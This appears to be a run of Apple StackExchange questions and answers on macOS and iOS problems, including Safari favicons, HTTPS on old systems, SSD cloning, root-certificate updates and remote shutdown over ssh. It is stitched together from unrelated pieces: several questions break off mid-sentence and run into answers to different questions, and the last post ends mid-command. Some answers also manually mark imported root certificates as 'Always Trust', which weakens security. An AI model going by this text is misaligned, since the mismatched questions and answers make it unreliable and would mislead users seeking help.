(It seems like there are stale cache files of some sort on the iPhone that just refuse to be removed. Looking at Safari in Storage Management there continues to be 3.3MB of data after all of my attempts to clean up. Possible that it could just be the database structure that take up that space.)\n\nI turned off iCloud for Safari on my devices.\nI deleted all bookmarks and reset Safari on my mac.\nRemoved Favicon Cache and Touch Icons Cache on mac.\nCleared Cache and history on my iPhone twice.\nRemoved all bookmarks and favorites from my iPhone.\nReinstalled BigSur over my BigSur installation.\nThe website in question is https://www.teamunify.com which hosts managed websites using the same base URL:\nhttps://www.teamunify.com/team/ilpac/page/home\nhttps://www.teamunify.com/team/iscats/page/home\nhttps://www.teamunify.com/Home.jsp?_tabid_=0&team=ilslsc\nhttps://www.teamunify.com/team/isnasa/page/home\nhttps://www.teamunify.com/team/ilhpac/page/home\n\nWhenever I save any of these sites as bookmarks on iOS they all use the Bookmark/Favorite icon of one site only: https://www.teamunify.com/team/ilhpac/page/home\nScreenshot of Start Page on Safari macOS BigSur\n\nScreenshot of Start Page on Safari iOS 15.01\n\n\nA: I found one way (possibly the only way) to remove/clear those cached \"Favorites\" favicons/touch images was simply to toggle the \"Favorites\" feature off and on. In my case the Favorites feature will only keep one favicon for all three websites because they all use the same domain. So I first visited the page whose favicon I wanted to use for all three of the bookmarks and now they all use that favicon.\nYou can find the toggle in the \"Customize Start Page on iOS\" by scrolling to the very bottom and tapping on \"Edit\". It seems that a domain's favicon/touch icon are indeed indelible after they have been added to Favorites the first time. Meaning the same favicon will be used for subsequent bookmarks that contain the same domain.\nThe other option is to not add bookmarks into Safari's \"Favorites\" folder, and use another bookmark folder instead as a \"Favorites\" folder.\n\n", "Q: What is com.apple.dasd.swapkills.plist? com.apple.dasd.swapkills.plist\nAnyone know what this is?

I'm running Safari 10.1.2 (OS X Yosemite most updated). Upgrading OS is not an option.  An answer which says only that is not an answer to this question.\nI surf a lot of web sites merely informationally. I'm not handling financial information or even logging into the site, I'm just literally browsing (e.g. a \"brochure\" website that only has public info).\n\"HTTP\" is perfectly appropriate for this browsing.\nI'm often getting \"trapped\".  Safari refuses to use \"HTTP\" because \"HTTPS\" exists.  However, there are issues with the website's certificate or other security glitches, where the Safari balks and says\n\nCannot open the page httpS://www.example.com because Safari cannot establish a secure connection to the server \"www.example.com\".\n\nThe HTTP connection would have been fine.\nIn the last week the number of such sites has increased exponentially.  (including StackExchange).  And in most cases, Chrome 87.0.4280.88 won't read the sites either, and says the site is not secure to provide my precious financial information, and so will not give me any path to browse it.  Again, not doing anything financial.\nIs there a setting to tell Safari \"don't worry about the security\" or \"just use HTTP\"? I hate to turn it off altogether but that's an option.\nUpgrading an OS is not an option as that will break MS-Office. (MS turned off the authentication servers so re-installs won't validate).\n\nA: In terms of handling your practical problem, you just have to enter \"http://\" manually in the address bar in Safari in order to use http instead of https. However, the server has a major say here, and they could actively be redirecting users to https using HTTP redirects. This is very common and often a good security practice. This means that Safari (and other browsers) will automatically switch to https.\nIn addition some sites might indicate to browsers that they only permit https queries in the future using the HSTS header - this is a practice that is becoming more and more common, and is also most often a good security practice.\nYou could use a different browser that has updated TLS functionality and CA repository so that you get https access working again for your sites. However, that would still leave your computer exposed due to the lack of operating system updates.\nA third option is to use a browser within a browser. I.e. it is possible to access a site via http that will essentially run a browser on a remote server whose user interface is displayed and operated within your browser. Technically the connection between that second browser and the site in question would be https, but you would access the result of that interaction though a http connection. Common examples of \"browser within browser\" are Browserling and BrowserStack - although you would have to test yourself if those can actually by accessed with your specific setup as they typically assume usage by https.\nThe best way to proceed here is to upgrade your system - operating system and browser:\nI know that you demand that the we do not answer this, but for the sake of other's that might read this, I must answer that the correct way to proceed is to upgrade.\nThe reason for this is that Yosemite no longer receives security updates, and is thus a target for explotation. There's a realistic risk that your computer will get infected, hacked, taken over, etc. Even though you are \"just browsing\" and not logging in, that risk is there.\nAs I understand from your comments, you're running on old Apple hardware for which no recent macOS updates exist. I would suggest upgrading to an alternative operating system, such as for example Linux.\nEven though you do not handle financial information, you might have other information on your computer, that you would like to keep private. Even if that is not the case, then you do expose other user's to risk when you do not update your own computer. Primarily because your computer could be taken over and used for nefarious purposes against on other user's on your local network, or over the Internet - for example by participating in DDoS attacks. You also run a financial risk in that malware some times install Bitcoin (or similar) miners, which will mean that your computer will start running a larger electricity bill than usual.\n", "Q: Unable to install printer driver for HP1606DN printer on Big Sur I have tried to configure the HP1606DN printer via IP address, direct driver download, EasySetup, and  HP Smart: none have worked.\nFor newer printers my preference for installation is to connect via IP address and then hopefully the printer will download the drivers properly.  For the HP1606DN I believe that were the case in the past: but it is not working now because only Generic PostScript or an incompatible HP printer type are  available.\nSo I have downloaded the HP driver from https://support.hp.com/us-en/drivers/selfservice/hp-laserjet-pro-p1606-printer-series/4110408/model/4110409\n\n[![enter image description here][2]][2]\nI installed EasySetup 2 and then connected by USB (I'd prefer to do ethernet but apparently we need a physical connection ??)

At least it is still kept as a sparse file.\nTo summarise:\n\n*\n\n*cp disk.img disk-copy.img doesn't preserve sparseness and destination file is the full 10G.\n\n*cp -c disk.img disk-copy.img keeps the sparseness but does a full copy of non sparse parts\n\n*cp-ing a non sparse file works as expected and finishes almost immediately\n\nIs there a way (either with cp or with C APIs`) to clone a sparse file?\n\nA: This doesn't seem to be happening anymore (I even checked with apfs-clone-checker, also, the copy now happens instantly).

At the moment, it is solved with the Camera Connection Kit (Charging+USB-Port to Lightning), which is plugged into a Power adapter and to the USB-Audio-Interface. However, this solution obviously only works for the old ipads and iPhones, but when a dance instructor comes and wants to connect an iPad pro or - god beware - an android device with USB-C, they completely mess up the system because they unplug all cables and then don't know how to replug them.\nThe question is: is there a way to have a single cable, preferably USB-C that charges and carries data and then a simple adapter or adapter cable to lighting? Are there any USB-C Docks that would work when adapted to lightning or do we need active components when adapting from lightning to usb c?\n\nA: Here's an expensive option but one that may be worth it since time is money, and I offer to at least give ideas.  I connected my iPhone 7 with an Apple USB camera adapter ( https://www.apple.com/shop/product/MK0W2AM/A/lightning-to-usb-3-camera-adapter ) to a Thunderbolt dock ( https://eshop.macsales.com/shop/owc-thunderbolt-dock ), the dock worked as a USB dock for Ethernet, audio, and USB-A ports.  This same dock performs the same functions when connected to my MacBook Pro by a USB-C cable and so would presumably do the same with any phone or tablet with USB-C.\nI don't typically plug in such a \"heavy duty\" dock into an iPhone, I merely did so to test the theory.  It worked for me so should work for you.  To connect a device with Lightning you'd use the camera adapter you have, but to plug in a USB-C device you'd use a \"full function\" USB-C cable.  (I specify \"full function\" cable because some cables only provide power, you would need a cable with all data lines connected which should come with the dock.)\nPlugging in a USB-C dock (USB 3.x or Thunderbolt) by a Lightning to USB-C cable will not work, you have to use the USB 3 camera adapter and a USB-A to USB-C cable.  The reason for this is a bit complicated.  There is no Lightning adapter with a USB-C female port that will plug into a USB-C dock, again it's complicated on why this is.\nTo plug USB peripherals into an Apple iPhone/iPad/iProduct with Lightning requires use of the USB 3 camera adapter, USB-C to Lightning cables will not work.  Even though it is called a camera adapter it supports many kinds of USB devices, as you discovered.  Supported devices includes a USB dock with Ethernet and audio interfaces, as I verified myself.\nWith an appropriate dock the users need only connect their tablet/phone/whatever to the Lightning adapter or the USB-C cable, then connect the other end to the dock.\nI know that's a long answer but this is a complicated issue.  Both USB-C and Lightning can act as master or slave to a data bus, and which role it plays is indicated by the cable that is plugged into it.  You want the device to be the master on the data bus and so you have to connect the right kind of cable.  Not using the right cable means the device is in slave, or peripheral, mode and will not communicate with attached peripherals as they will also be acting as slave devices.\nGiven my long answer you may find it easier, and certainly cheaper, to keep doing what you are doing.\n", "Q: Using an Airport Extreme to distribute files to local units without internet? I have an old Aiport Extreme 802.11n 5th Gen and while plugged in to a router or ethernet with Internet, it is as we know possible to access any attached storage to a Mac which is connected to the Airport, from other units, such as an iPad.\nNow, I'm wondering, whether it's possible to do this without the use of any internet (bar possibly the exception of using your iphone as a personal hotspot?)\nThis could be any type of local client based server, SMB or WEBDAV or whatnot, as long as my Macs files can be accessed through the Airport unit without being connected to the internet.\nGrateful for help!\n\nA: You can always run a local storage server based on SMB, WebDAV or similar protocol - and access it from other units that are connected network-wise to that storage server.\nYou do not need internet connectivity, nor do you need an AirPort Extreme.\nYou can use any (reasonable) kind of network switch to connect multiple Macs together, and you can use any (reasonable) kind of Wireless Access Point or Wireless Router to get iPhones and iPads connected as well. It does not have to be \"AirPort\" branded.\n", "Q: Mojave: Is there a way to stop or delay the sorting of items in the finder using list or column view? Looooooong time Mac user.\nI have a particular older system I use for cataloging items.\nI get a folder of 50+ items, then have to manually rename each item. Batch renaming isn't useful and would actually be more work because there's little to no commonality between the files. I do have, run, and love A Better Finder Rename, but even that isn't useful for this process 90% of the time.\nIn Yosemite's Finder (column view), I could rename a file then hit Return and quickly hit the ↓ or → key to move to the next file. Hit Return, rename and quickly hit ↓ or →... repeat. This had a benefit of keeping the active file focused in the relevant list of items where I needed to be. If I paused for a few seconds before hitting return in the next file, then the list would re-sort. But I had roughly 5 seconds to enter renaming mode on the next file before re-sorting occurred.\nIn Yosemite, after about 20-30 files I'd have to relaunch the Finder due to some cache that started getting bogged down. Renaming and cursor movements would start getting delayed - the more I files I renamed the longer the delay would become. Relaunch Finder.. all back to 100% speed. I learned to live with this.\nI recently upgraded this system to Mojave, as far as it can go. In Mojave's Finder (column or list view), as soon as I rename a file and hit Return the file instantly moves to re-sort based upon its new name. No matter how fast I hit the arrow keys, the file moves. I've searched and searched for a way to delay or turn off this \"instant resort\" behavior and I've come up with nothing. I've turned off (reduced) animations, etc and there's been no change.\n\nIs there a way in Mojave's Finder to manually rename a list of files without the files instantly moving to re-sort based upon their new name? Some sort of \"delayed re-sort\"?\n\nI can't use icon view, it's too cumbersome. And the insta-move behavior seems to happen in column and list view equally. I've tried grouping by various things, but since the files are all the same \"type/kind\" and created at relatively the same date, and the name is changing, the file still always move to some degree.\n\nA: After some discussion…\nIf you use List view rather than Column, then you can add extra columns allowing you to sort by various non-standard parameters, which could result in your chosen sort not changing with a simple file rename.\nI tend to use date modified for my photos - a name change does not qualify as a 'modification' so things will stay where they are after a rename.\n\n\n\n", "Q: Can I charge my new iPhone with iMac Recently I bought an iPhone online and it's delivered to me today.

When I right-click on a link it gives a few options: Copy Link and Share. Under Share, there are a few options that appear to come from the \"Share Menu\" in Preferences.

The second action in the workflow is \"Run Shell Script\", using /bin/bash as the shell and passing input as arguments with the following body (most of which was automatically populated):\nfor f in \"$@\"; do\n  open -a /Applications/Safari.app \"$f\"\ndone\n\nI named my service \"Open in Safari\". Save.\nThen I set up a global shortcut in System Preferences > Keyboard > Shortcuts > Services > General > Open in Safari, click on (none) and add my shortcut which I set to Ctrl+Shift+S, though it could be anything. I'm not sure if that key combination will clash with something else or not.\nSo now I can just right-click on a link in Outlook, select Copy Link, then hit my key combination to open the link in Safari. The only other side effect is that the link also gets opened in Firefox which is set as the default browser. I'd be interested to find out how to stop this behavior.\n", "Q: How can I put a podcast on my USB device? I have running headphones that I connect to my Mac via USB (they mount as an external volume).  I can't figure out how to download podcasts onto them. When I try dragging the file from the \"Downloaded\" section of the Podcasts app into the relevant folder in Finder, nothing happens.  When I try dragging the file from the \"Your Episodes\" section of Spotify, it seems like a soft-link back to spotify is the thing that get's pasted.\nI feel like I used to do this no problem?\nFurther information: Mac is 2020 MacBook Pro, macOS 11.4, Podcast app is version 1.1.0.  Headphones are old Sony Walkman, but they mount just fine and I can pull up the folder in Finder where I want to move the podcast file to.\nI would be happy to drag the file from one finder window to another, but I don't see where the Podcast app actually stores the files in Finder and there's no \"show in Finder\" option when I right click the episode in the Podcat app.\n\nA: Podcasts stores downloaded files at this location in Finder:\n~/Library/Group Containers/243LU875E5.groups.com.apple.podcasts/Library/Cache\n(You can access this by using \"Go to Folder\" option in Finder, which is Command+Shift+G)\nUnfortunately, these episodes are not labeled with the episode name. If you open the file in VLC, however, the embedded data will be visible.

I have a Mid 2014 Retina Macbook Pro (MacbookPro11,1), running latest Big Sur. I want to upgrade to a 1TB SSD. I bought a compatible SSD from OWC, so my question is what's the best way to get all my stuff over onto it? Seems like there are three possibilities:\n\n*\n\n*Clone existing SSD to new one, enlarge partitions, then boot to it. I don't think I can do this, because I don't have the special proprietary SSD enclosure to mount it (and they're like $60 for something I'll use once). Also I'm not sure this will work due to Big Sur's system partition signing.\n\n*Back up existing SSD to a HFS-formatted external drive (I have a 2TB rotating drive in a USB 2 enclosure I can use for this), swap in new SSD, install MacOS fresh (from a recovery drive?), then restore apps & data from backup.\n\n*Back up existing SSD to external drive with CCC, swap out SSD, boot to backup drive, then restore to new SSD using CCC. This seems unlikely to work due to Big Sur's system partition signing.\n\nIf I use option 2, is it best to use Time Machine & restore from that? Or use Carbon Copy Cloner and then Data Migration? And also how do I install MacOS on the new SSD? I'm guessing I create a bootable USB recovery drive and use that.\n\nA: There is a way, without any external software via the asr command. If you have an external drive with a GUID partition scheme this is fine.\nYou have to create an APFS container on the external disk (I suppose you can do it) then run the clone command on this disk :\nThe terminal command :\ndiskutil list\n\nwill help you for the rest\nIt's necessary to give in source the volume which is entitled:\nSnapshot com.apple.os.update.......\nand in destination (target) the APFS container created on the external disk\nsudo asr --source /dev/diskxsys1 --target /dev/diskz --erase\n\nThe cloning will be done and then you have to test that you manage to start on this external drive.\nIf so, it will suffice to mount the new SSD, format it in APFS and do the opposite.\n", "Q: How can I use the Built-in display as the primary monitor, and a projector (via HDMI) as secondary? I have a Mac mini which has no display which I connect to it by sharing the screen to my laptop.  The Mac mini runs apps which controls my live show's backing tracks, lights and video. The video projector is connected to the mini via HDMI.\nI would like the mini to still use the Built-in display as the primary, and the projector act like a second display so it can be used for the videos, but allow me to still see the Mini desktop and other apps via the screen share.  However, when the projector is connected, the Mac automatically selects it as the primary display, and Built-in Display is gone.\nIs there a way around this?\n\nA: I think the easiest solution here is to get a \"headless display dongle\", which basically is a small dongle that fits into the HDMI or DisplayPort connector and simulates a display - without actually displaying anything or connecting to anything.\nFor examples of such a product, see for example the fit-Headless product series or the NewerTech display emulator.\n", "Q: New macOS install \"missing commands\" but commands already exist in /usr/bin Mostly just want clarification on why macOS is doing this:\nOn a fresh install I tried to use the strings command in Terminal and a pop up came up.\n\nI chose to \"Install\" and waited - it stuck.

This is the opposite of the way it seems DND is intended to work.\nI can't do a reverse version of DND (DND during the day) because it kills the vibrate feature.\nI need to get calls overnight for work, but I don't want to have to remember every single night to flip the switch on my phone. How can I accomplish this on iOS?\nI am currently on version 14.8 (18H17) running on a 12 pro max.\n\nA: Try a custom ringtone...?\nI would recommend creating a custom ringtone that has silence for the first X seconds, then rings however you'd prefer.  This would allow you to answer/ignore any calls you feel coming in via vibration, while not making any ring sound for the first X seconds.  Then you can leave your phone's ringer on all the time.\nThe only caveat is that once you hear your ringer, you'll only have 24-X seconds left to answer it.\nFeel free to adjust those timings as you see fit, of course.\nAlternatively, you could also use a custom ringtone that starts quietly, then gets louder.  Same idea, but audible throughout the ring.\nAlso, a combination of the above could also be employed.\nBtw, I believe Garage Band will allow you to make ringtones if you don't have any other options.\n", "Q: How can I prevent the Finder from jumping to Desktop1 after logout?

Is there anyway to filter out locked device IDs?\n\nA: One possible way would be to install libimobiledevice from HomeBrew, and then run a command like this:\nideviceinfo -u XXX -k PasswordProtected\n\nwhere you replace XXX with the UDID for the device. It should be able to tell you whether the device is locked or not - if it is locked, you could then just skip your ionic command for that device.\nAnother option would simply be to examine the output from the ionic command and store the fact that it gave you that error reporting the device as locked. Then you could look that up in subsequent runs and skip the device. I would store a timestamp along with the information, so that you could cache the fact for a limited time period only (for example 1 hour).\n", "Q: How can I disable ringing when receiving a text message on an iPhone 6s?

On intel macs you can set a firmware passcode that is separate from the admin user account passcode (which I do want child to have access to).\nApple seems to have started to address this missing feature with M1 Macs here: https://developer.apple.com/documentation/devicemanagement/set_recovery_lock_command\nMy question is, can someone help me figure out how to actually implement this on an individual machine without an MDM server?\nOr alternatively - I'm mainly wanting to restrict the ability to boot into safe mode specifically. So if anyone has any ideas on how to do that - that would be helpful as well.\n\nA: You are right, setRecoveryLock is the replacement on Apple Silicon (M1) Macs for setting a firmware password lock. Apple calls it recoveryOS password.\nHowever, unfortunately, it looks like there is no other way to set a recoverOS password than from an MDM (Mobile Device Management) solution. MDM is offered as a service by several companies. So it looks like we must subscribe to such a solution in order to set a recoveryOS password on our Macs.\nAfter searching the web for a while, I eventually found ManageEngine. This offering has a Free Edition that includes the possibility to set a recovery lock. So this looks like a solution.\nI want to note that I'm not affiliated with that company and that I haven't tried their solution myself yet.\nI've also had the idea to subscribe to an MDM for one month (or use the free trial), then set the recoveryOS password and unsubscribe. However, I'm unsure about what happens with the managed device after the MDM service has been unsubscribed, but I would assume that the recovery lock remains effective on the Mac.\nFor the second part of your question (restrict booting into safe mode), see also Any way to block Safe Mode on a Macbook w/ an M1 chip?\n\nA: You can’t prevent the M1 from being erased, so set a policy in place so the person knows what’s expected and set penalties for if you catch them removing or changing software.\nEven with MDM, there’s not a technical way to prevent erasure of the hardware.\nI would sign up for JAMF Now which is free for your first few devices and explore if management and a recovery password is good enough for your specific needs.\n\n*\n\n*https://login.jamfnow.com/\n\nA: Make your child a non-admin user, and make yourself an admin user. To access recovery mode, you need to enter the password of an admin user on m1 macs. Only problem where this might cause issues is he needs the admin password, but if he doesnt, then this will work.\n", "Q: MacBook Pro 2019 13\" RAM upgrade My MackBook specifications are shown in the screenshot below:\nI would like to upgrade my MacBook RAM from 8GB to 16GB.

I'm not sure what library the app is using for https -- it may be libcurl, but I suspect it's failing for the same reason curl is.\nSmall addendum: the open source app is using OpenSSL 1.1.1j.\n\nA: OpenSSL on macOS does not use the system keychain (which makes sense as it's a cross platform library) but rather has its own .pem file containing its root certificates. Even though my systems have a newer version of OpenSSL installed using homebrew and/or MacPorts, the system-wide OpenSSL pem file located at /etc/ssl/cert.pem was out of date and did not include the ISRG Root X1 certificate.\nThe solution:\n\n*\n\n*Rename /etc/ssl/cert.pem to something else. (I suggest /etc/ssl/cert.pem.org)\n\n\n*Download the latest cacert.pem from https://curl.se/docs/caextract.html\n\n\n*Rename it to cert.pem\n\n\n*Copy it to /etc/ssl/cert.pem\nNow curl and any other app using OpenSSL can access websites signed using current Let's Encrypt certificates.\nAlternatively, the MacPorts package curl-ca-bundle installs a pem file containing ISRG Root X1 to /opt/local/etc/openssl/cert.pem which can be used as well.\nOther possible solutions:\n\n*\n\n*Manually add the ISRG Root X1 certificate to /etc/ssl/cert.pem\n\n\n*Configure OpenSSL to use a different .pem file for its root certificates, such as /opt/local/etc/openssl/cert.pem\n", "Q: Should I worry that my battery Cycle Count is 1215? I almost always have my laptop on charge since I work at a desk. I recently notice \"service recommended\" warning (it might have been there for some time)\nis there something really wrong and to worry about? Or would I be ok to keep using this MacBook since I don't need to use it un-plugged.\nWe've been thinking of buying a MacBook Air for my father, he would only use to browse FaceBook and write his book. I use my MacBook way too much - for personal web dev projects, entertainment ...\nwould giving this to dad and me buying a new one be a good idea or is this still a good laptop for me (I absolutely love it, if I didn't just read about battery cycles I wouldn't have noticed anything)\n\n\nA: All laptop batteries age, and wither, and die, and it's this that affects the continued viability of the computer. You've had that one for over 5 years, and it is only holding 60% of its original capacity.\nIf you mainly intend to use it plugged in, then then it's not really a problem, though the battery will continue to degrade. The computer does need a working battery to function properly: without it, it will throttle the CPU. There is a teeny-tiny risk that as it continues to degrade, it could catch fire or explode, (though presumably, if it's not holding much energy...:lol: )\nMy advice would be to take it to an Apple Store. Apple will replace the battery for around $200, I think. You will then have a laptop that's 'as good as new', which will work reliably for another 5 years or so, either for you, or your Father.\n\nA: In general, there is no need to replace the battery unless\n\n*\n\n*You are facing usage issues (such as the machine turning off before the battery is at 0%) or you're unhappy with your battery life\n\n*The battery is swollen (you'd usually notice if the bottom case starts bending and the Mac doesn't sit straight on the table anymore).\n\nIn the case of a swollen battery - that could be a potential safety hazard and the battery shouldn't be charged anymore and replaced immediately.\nIn the special case of your MacBook model (15\", Mid 2015) there are models with faulty batteries, in which case Apple would replace them for free.

Other output devices, like other Bluetooth headsets, work fine.\nI have tried\n\n*\n\n*restarting chrome\n\n*restarting Bluetooth\n\n*clearing the cookies for meet.google.com\n\n*restarting the computer\n\n*removing the AirPods Max from macOS completely and reconnecting them\n\nIt sounds a bit like this, but none of the suggested workarounds there work for me.\nI'm on macOS Big Sur 11.6\n\nA: Excellent reference article. Since this specific web app is reported as unreliable on both macOS and windows and wired and wireless headsets, that indicates the web app itself has issues with sound output and not that you have made a configuration error.\nIf other Google apps play sound in the browser like YouTube you might need to keep trying new browsers, incognito mode (basically ensuring the web app and local data storage are not corrupted by the app) and work with the vendor to get the app fixed.\n\nA: I stumbled over the solution for me:\nFirst I gave up and switched to another, non-Apple, Bluetooth headset.\nAfter using that for a little while, I tested switching back to the AirPods Max, and then they worked fine again.\n", "Q: How to update my root certificates on an older version of macOS (e.g. El Capitan)? I have not been able to get the script from this post to work.\nHow do I update my root certificates on an older version of macOS (e.g. El Capitan)? How do I update my root certificates on an older version of Mac OS (e.g. El Capitan)?\nI have an old mac laptop running El Capitan 10.11.6 that I can't update the system on due to work apps. With the recent updated certificate problem, many internet sites are throwing errors for legitimate sites rendering the laptop fairly useless.\nThe post above has a script in it to update certificates that others have used successfully.\nFrom the prior post answer:\n\n*\n\n*First find the more modern Mac with a working set of System Root certificates (i.e. that can access the problematic web sites)\n\n*On that Mac, launch Keychain Access, select \"System Roots\", select all the certificates, select File > Export, and export them as rootcerts.pem file. This file will contain all the certificates concatenated.\n\n*Copy the rootcerts.pem file to your antique Mac.\n\n*Make the trustroot shell script below, e.g. by copying it into a file, then use: chmod 755 trustroot\n\n*Run sudo ./trustroot rootcerts.pem\n#!/bin/bash\nDIR=${TMPDIR}/trustroot.$$\nmkdir -p ${DIR}\ntrap \"rm -rf ${DIR}\" EXIT\ncat \"$1\" | (cd $DIR && split -p '-----BEGIN CERTIFICATE-----' - cert- )\nfor c in ${DIR}/cert-* ; do\n   security -v add-trusted-cert -d -r trustRoot -k \"/Library/Keychains/System.keychain\" \"$c\"\ndone\nrm -rf ${DIR}\n\nAnyway, I bogged down when it came to using Terminal. Can someone please give me some total idiot, step by step directions? I was able to make and transfer the rootcerts.pem file from a newer computer, but then it all fell apart.\nQuestions:\nWhere is the rootcerts.pem file supposed to be filed on the old machine?\nI opened Terminal and it shows my hard drive, and then what?\nThe directions say to make the script by copying it into a file.\nI presume copying it into a file means copying the #!/bin/bash section above into the Terminal shell?\nThen you use: chmod 755 trustroot\nDoes that mean you copy chmod... into Terminal after adding the #!/bin/bash section?\nNext run sudo ./trustroot rootcerts.pem\nI assumed that meant that you copy this into Terminal after chmod?\nResults:\nAfter -----BEGIN CERTIFICATE-----' - cert- ), I get\ncat: : No such file or directory \n\nThen:\n***Error reading file /var/folders/db/y44522y562b31ctgp11mz8000000gn/T//trustroot.1429/cert-*\n\nI don't know what this means, which file has the problem, or how to correct the problem. Any ideas?\nI tried looking up directions for using Terminal, but those directions don't seem to follow the steps here and I'm not sure what I'm missing and what corrections to make. I can do many things, but when it comes to Terminal, my brain shuts down.\n\nA: Important! To save yourself grief and extra work:\n\n*\n\n*Back up all Keychain files before running this script.\nHere: HD/Library/Keychains\nHere: HD/System/Library/Keychains\nHere: HD/Users/YourHD/Library/Keychains\n\n\n*Only export root certificates from a new Mac that are not already listed in your old System Roots certificates.\n\n\n*Do not Delete any System Roots certificates in Keychain Access.\nAfter spending more time on this than I ever wanted to, I got the script in https://apple.stackexchange.com/a/422333/9058 working. I don't know if it's the right way to do it, but it is working and I can now access all the sites that were being blocked as invalid on Safari and Google Chrome that are actually valid.\nFor anyone else who wants to try doing this, this is what I did to get the script working. This worked on an old Mac laptop running El Capitan 10.11.6.\nI made a folder titled certificates on my user hard drive. I put the rootcerts.pem file from the new Mac in the folder.\nI then opened a text editor to make a file for the script.\n(TextEdit or TextWrangler etc. If using TextEdit format the file as plain text.)\nCopy and paste the entire #!/bin/bash script into the new file.\nSave the file as trustroot.sh in the certificates folder.\nOpen terminal. I didn't know what directory I was in so I entered: echo $PATH\nI was in the wrong directory so I entered the path to get to where I had created the folder (Your PATH/path may be different depending on where you saved your folder):\nAt the next prompt enter: cd ~/certificates/\nHit return.\nNext enter: chmod 755 trustroot.sh\nHit return.\nLast enter: sudo ~/certificates/trustroot.sh rootcerts.pem\nHit return and the script will run.\nOr:\ncd ~/certificates/\nchmod 755 trustroot.sh\nsudo ~/certificates/trustroot.sh rootcerts.pem\n\nTo log out of Terminal after script ends type: exit\nThe script ran perfectly and added the new certificates to the System folder in Keychain Access.\nReturn to Keychain Access and set only the SSL value of the new certificates to \"Always Trust.\" The remaining menus should be set to \"Use Custom Settings\" and the rest set to \"no value specified.\"\nI don't know much about certificate security so if someone has a better answer, please correct this answer.\nImportant Note:\nIf you imported Duplicate root certificates to your System Keychain, you will overwrite the Root certificate trust settings in the System Roots Keychain. The System Roots certificate will now be set to use \"Always Trust\" which is a security problem. Duplicates will have blue crosses on the certificates indicating the certificates are using Custom Settings.\nHow to change the System Root certificates from using Custom Settings back to using the System Default settings:\n\n*\n\n*In Keychain Access, delete any duplicate certificates from the System Keychain. Do not delete any System Roots Keychain certificates.\n\n\n*In the System Roots Keychain, open a certificate with a blue cross indicating a certificate with Custom Settings. Open the Trust section. Change all sub-menus from \"Always Trust\" to  \"no value specified.\" The main menu value should change to \"Use System Defaults.\" Close the certificate window.\nEnter your admin password when asked if you want to modify the keychain.\n\n\n*Reopen the certificate you just changed. Select \"Use System Defaults\" again. Close the certificate.\n\nEnter your admin password when asked if you want to update the keychain.\nIf you are not asked to enter your password after you close the certificate, the settings are not changed. Go back and reselect \"Use System Defaults\" again. Close and enter your password.\nThe blue cross takes a couple of seconds to disappear, but the Root certificate should return to the original system default settings.\nUpdating the trust settings creates a duplicate certificate in the System Keychain.\n\n\n*Open the System Keychain and delete the duplicate root certificates. Restart your machine.\n\nYou should now be able to use the internet again on your old Mac laptop.\n\nA: The following procedure worked for me on a machine running El Capitan. Note that you need access to the GUI.\n\n*\n\n*Download the ISRG Root X1 certificate file from http://x1.i.lencr.org/\n\n*Open the Keychain Access app and drag that file into the System folder of that app.\n\n*Find the ISRG Root X1 certificate in System and double click on it, open the Trust menu and change \"Use System Defaults\" to \"Always Trust\", then close that and enter your password to confirm the change (if prompted).\n\nSource: Certify The Web\n", "Q: Freezing of OS, Finder, Slowness I've previously asked all over the Internet about Finder freezing.  The symptoms of this are, well .. as you can guess, Finder no longer responding.  Spinning beach ball.  I can't open . from the Terminal, and restarting Finder (either by long-press and 'force quit', or by killall Finder from within Terminal) has no effect.  Even rebooting the machine via the 'usual' means doesn't work, and it will hang for days.  The only solution is to cycle the power, and start again.\nSo, over the course of the weeks and the months where this was happening, I have noticed that it seems to be linked in some way to my external drives.  I have a powered hub in the back of the Mac, and that has four external USB drives.  There are also cables for a Garmin GPS, an iPhone, and an SD reader.  None of these is automatically mounted, and if I leave them without mounting them, the Mac will happily stay up for weeks.\nHowever, as soon as I start to use them, attaching them, using them and detaching them, then the problems will start.\nSo .... can anyone shed light as to why this problem happens when I use external drives?\nThanks.\nFor information: Mac Mini running 10.15.7 (19H1419).\n\nA: In a previous life I worked for MacWarehouse. They got a contract to answer pre-purchase tech support calls (AS Apple) for a few Apple programs. Part of that was two weeks training as a support tech for the Apple Assistance Center (Apple support before there was \"AppleCare\"). One of the things I remember (other than \"Chooser wars\"...) is what they called the first principle of troubleshooting:\n\"Isolate and Identify.\"\nWhich basically means that if you are troubleshooting a hardware problem, unplug everything. And put back any removed/replaced internal hardware if at all possible.\nFor software issues, disable or uninstall the software.\nThis leaves you with a stock Mac, as it came from the factory. So no if the problem is still happening then you can blame the OS and/or the Mac itself.\nIn your case, where you are dealing with external devices, unplug Every. Single. One. of the devices and verify the Mac works fine without them.\nIf it doesn't then you have an OS/software problem or a hardware problem. So I would back up the system. Wipe the drive and install the OS fresh. Then you verify it works with just the OS and start installing software. After each install verify that the system is working properly.\nOnce that is done you can restore your documents, settings, etc. and verify it is still working. If so, great, if not, it is likely a settings file that was just restored.\nOnce you have a working system start plugging hardware into it. One at a time and verify everything works before you unlplug that device and plug in another device.\nIt is slow, annoying and simple a process of elimination.\nAs you add back software and hardware you are looking for changes in behavior that you can then easily undo (as you are making ONE change at a time) and verify that change was the problem, whether it was a hub, drive, monitor, application, or whatever.\nYour particular issue should yield to this method and if you un-plug everything and the problem persists it is possibly OS-related, or maybe related to a problem with the internal drive.\nWhich brings up the second most important troubleshooting principle:\nBack up your data before you do anything.\n", "Q: Quit Terminal after Running SSH \"shutdown\" Apple (Shell) Script for Remote Machine I have made a small apple script (calling a shell script using ssh) to remotely shutdown/hibernate my windows machine. I export the script as application so I can easily call it from my raycast search.\nset question to display dialog \"Are you sure you want to hibernate pDesktop?\" buttons {\"Yes\", \"No\"} default button 1 with icon caution\nset answer to button returned of question\n\nif answer is equal to \"Yes\" then\n    do shell script \"ssh -t phili@192.168.0.11 'shutdown.exe /h'\"\nend if\n\nThis works fine, however after executing the script (or even just the shell ssh command in a terminal), the terminal on mac os hangs (because the remote server closes the connection) and I have to kill the process.\nIs there any method to prevent this? Or a better/recommended method to remotely send a shutdown command?\nThanks\nphil\n\nA: You can try to run the command on the other host with nohup and in background (&) :\n\"nohup ssh -t phili@192.168.0.11 'shutdown.exe /h’ &\"\n\nYou may need to redirect output and error :\n\"nohup ssh -t phili@192.168.0.11 'shutdown.exe /h’ >./nohup.out 2>./nohup.err &\"\n\n\nA: I tried the suggested nohup ... & solution which did not work (it was asking for some input in the terminal and run as script it would still hangup). Then I tried the nohup ... >./nohup.out 2>./nohup.err & suggestion but simply nothing would happen.\nSo I played around with the different options trying to set countdown to hibernation to 1 second:\nssh -t phili@192.168.0.11 'shutdown.exe /h /t 